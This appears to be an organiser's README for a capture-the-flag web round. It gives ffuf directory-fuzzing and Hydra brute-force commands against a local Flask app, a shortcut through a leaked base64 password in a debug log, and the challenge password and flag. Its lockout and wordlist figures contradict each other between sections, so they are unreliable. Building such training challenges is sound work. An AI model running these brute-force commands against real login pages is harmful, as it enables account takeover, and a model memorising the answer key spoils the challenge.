# Round 3 — Web Enumeration (ffuf + Hydra)

## What this round teaches
1. **Directory discovery with ffuf** — finding a page nobody linked to.
2. **Credential brute-forcing with Hydra** — cracking a login, while respecting
   a lockout (so blind spraying punishes you).
3. Flags in this round use a **prepended** format: `CTF{token_domain}` where the
   random token comes FIRST, not last.

Participants are only given: the running URL, and (optionally) the two wordlist
files if your event is offline / you don't want them downloading SecLists.

---

## Part A — Get it running locally (today, for your demo)

### 1. Install dependencies
```bash
pip install flask --break-system-packages
```

### 2. Run the app
```bash
cd round3-challenge
python3 app.py
```
It will start on `http://127.0.0.1:5000`. Visit it in a browser — you'll see a
normal-looking logistics company homepage. That's the whole point: nothing
looks obviously "CTF" about it.

### 3. Install ffuf and Hydra (if not already installed)
```bash
# ffuf
sudo apt install ffuf        # Debian/Ubuntu
# or: go install github.com/ffuf/ffuf/v2@latest

# hydra
sudo apt install hydra
```

---

## Part B — Solve it yourself (do this before the demo so you know it works)

### Step 1 — Discover the hidden portal with ffuf
```bash
ffuf -u http://127.0.0.1:5000/FUZZ -w wordlists/ffuf_directories.txt -mc 200
```
- `-u` — the target, with `FUZZ` marking where each wordlist entry gets substituted
- `-w` — the wordlist
- `-mc 200` — only show results that returned HTTP 200 (found pages)

You should see something like:
```
internal-portal-x92    [Status: 200, Size: ...]
```
That's your hidden endpoint: `http://127.0.0.1:5000/internal-portal-x92`

*(Tip: the homepage also has an HTML comment mentioning a username, and
`robots.txt` lists the same path as a secondary hint — view-source and
`/robots.txt` are legitimate enumeration steps too.)*

### Step 2 — Crack the login with Hydra
Visit the discovered page in a browser first, right-click → View Page Source,
to see the exact form field names (`username`, `password`) and the error text
(`Invalid credentials.`) — Hydra needs to know what a *failed* login looks like
so it can tell success from failure.

```bash
hydra -l dev_admin -P wordlists/hydra_passwords.txt \
  127.0.0.1 -s 5000 http-post-form \
  "/internal-portal-x92:username=^USER^&password=^PASS^:Invalid credentials"
```
- `-l dev_admin` — the username (hinted in the homepage's HTML comment)
- `-P wordlists/hydra_passwords.txt` — password list to try
- `http-post-form "path:params:failure_string"` — tells Hydra the form, how to
  fill it, and what text means "wrong password"

**Important — the lockout:** after **3** wrong attempts from one IP, the app
locks that IP out for **90 seconds**. Even the correct password gets
rejected while locked out.
```bash
hydra -l dev_admin -P wordlists/hydra_passwords.txt \
  -t 1 -W 3 \
  127.0.0.1 -s 5000 http-post-form \
  "/internal-portal-x92:username=^USER^&password=^PASS^:Invalid credentials"
```
The real password sits at line 100 of a 130-line list, so a pure brute-force
run costs roughly 33 lockout cycles (~50 minutes of enforced waiting) before
it succeeds — plus the ffuf discovery time on top. That's the intended floor
for anyone who just runs the tools without digging further.

### Step 3 — OR: the shortcut path (for participants who actually read source code)
This is deliberately NOT signposted anywhere obvious. It rewards teams who
inspect things properly instead of only brute-forcing:

1. View-source the login page (`/internal-portal-x92`) → notice it loads `<script src="/static/app.js">`
2. Fetch `/static/app.js` → find a comment mentioning a leftover debug log from an incident
3. Fetch `/static/debug.log` → find a line with a base64 "rotation payload"
4. Base64-decode it → that's the real password, no Hydra needed at all

This path exists so a genuinely thorough team can finish in the time it takes
to read three files and run one `base64 -d`, while a team that only runs
tools mechanically still gets through — just slower, via the lockout math
above. Both are legitimate "web enumeration" skills; one just rewards
depth over patience.

### Step 4 — Log in and grab the flag
```
http://127.0.0.1:5000/internal-portal-x92
```
Username: `dev_admin`, Password: `yT7g#BCK!BQ4`

Flag:
```
CTF{jdwkhekdjbefh_roundthree.ctf}
```
Note the token (`jdwkhekdjbefh`) is at the **front**, exactly as your seniors
asked for.

---

## Part C — Tuning difficulty (this is how you control the "1hr+" target)

Everything below lives at the top of `app.py`:

| Variable | What it controls | To make it HARDER |
|---|---|---|
| `HIDDEN_PATH` | the ffuf target | make it less like the wordlist entry, or bump ffuf wordlist to 2000+ decoys |
| `wordlists/ffuf_directories.txt` size | how long ffuf takes | more decoy lines = longer scan time |
| `MAX_ATTEMPTS` / `LOCKOUT_SECONDS` | brute-force pain | lower `MAX_ATTEMPTS` (e.g. 3) and raise `LOCKOUT_SECONDS` (e.g. 300) forces participants to be *precise* with their password list instead of spraying |
| `wordlists/hydra_passwords.txt` | password search space | more decoys, spread further from obvious guesses |
| Homepage hints | how easy it is to build a good password list | remove/obscure the "Harbor" branding clues to force more guessing |

**As currently configured** (`MAX_ATTEMPTS=3`, `LOCKOUT_SECONDS=240`, real
password at line ~40 of a 70-line list, ffuf target buried in a 1200-line
list): expect roughly 45–70 minutes total — a mix of a few minutes of real
ffuf scan time plus ~50 minutes of enforced lockout waiting during Hydra.
This time cost comes from the server's throttle, not from hidden clues, which
is deliberate: it can't be shortcut by asking an LLM to "just guess the
password" the way a themed password could be.

To push it further past 1hr, or bring it back down if it's too brutal:
- Raise/lower `LOCKOUT_SECONDS` — this is your main dial, it scales almost linearly with total solve time.
- Move the real password further into (or earlier in) `hydra_passwords.txt` — later position = more lockout cycles.
- Raise/lower `MAX_ATTEMPTS` — fewer attempts before lockout = more total lockouts over the same wordlist.

Re-run the `random.seed(...)` generation script (ask me and I'll regenerate)
with bigger decoy counts once you're happy with the balance.

---

## Part D — Git workflow (do this once app.py works)
```bash
git clone https://github.com/MRebeccaF/round-3.git
cd round-3
git checkout -b round3-additions
# copy app.py, wordlists/, README.md into this repo
git add .
git commit -m "Add ffuf/Hydra enumeration challenge with lockout"
git push origin round3-additions
# then open a PR into master, or merge locally if you have access
```

## Part E — Demo checklist for tomorrow
- [ ] `python3 app.py` running, homepage loads
- [ ] Run through Part B yourself end-to-end once, timed
- [ ] Have both wordlists ready to hand to participants (or confirm they can
      pull SecLists if it's an online event)
- [ ] Explain the flag format explicitly in the rules (`token_domain`, token first)
- [ ] Mention the lockout in the rules — "brute force is allowed, but the
      server will throttle you if you're not careful" is a fair warning, not
      a spoiler